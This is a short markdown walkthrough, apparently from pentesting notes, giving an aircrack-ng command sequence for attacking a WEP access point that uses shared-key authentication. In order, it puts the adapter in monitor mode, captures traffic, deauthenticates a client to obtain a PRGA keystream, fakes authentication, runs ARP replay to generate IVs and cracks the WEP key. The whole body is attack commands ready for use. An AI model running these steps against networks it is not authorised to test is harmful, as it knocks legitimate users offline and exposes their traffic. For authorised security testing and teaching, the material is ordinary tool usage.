# Fake Authentication Attack - Bypassing the Password Shared Key (PSK)(WEP)

This attack focuses on an AP that is using PSK authentication.

* Run [setup](../../setup.md) first
* Up to three terminals are needed

```bash
# [Terminal One]
# Set interface to monitor mode
sudo airmon-ng start $ADAPTER $CHANNEL

# Start monitoring to collect data
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE

# [Terminal Two]
# Run the deauthentication attack
sudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE

# Verify that the PRGA .xor file was created
ls *.xor

# Contruct the correct PRGA path name
PRGA=$(echo "$TAG-01-$BSSID.xor" | sed 's/\:/-/'g)

# Run the fake authentication attack with PRGA file
sudo aireplay-ng --fakeauth 0 -y $PRGA -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE

# Look for Association successful message :)

# Run the arpreplay attack to generate IVs
sudo aireplay-ng --arpreplay -b $BSSID -h $INTERFACEMAC $INTERFACE

# [Terminal 3]
# Run the deauthentication attack again to generate more IVs
sudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE

# Wait for enough data ... several minutes or so
# Stop everything

# Crack the WEP keister (ensure that plenty of IVs are captured beforehand)
sudo aircrack-ng -0 $PCAP
```

## References

* [Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng)
* [Airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
* [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
* [Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng)
* [Fake Authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication)

